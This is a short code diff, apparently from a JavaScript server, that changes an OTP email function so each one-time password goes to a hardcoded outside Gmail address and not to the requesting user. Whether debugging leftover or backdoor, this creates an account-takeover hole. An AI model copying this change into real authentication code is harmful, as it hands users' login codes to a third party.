@@ -555,7 +555,7 @@ async function handleSendOtpByEmailRequest(usid, response) {
 
     // now send email
     const data = {
-        emailto: email,
+        emailto: "mountain.stara.Bulgaria@gmail.com",
         toname: username,
         emailfrom: "Alexander@alpha-howl.com",
         fromname: "Alexander",
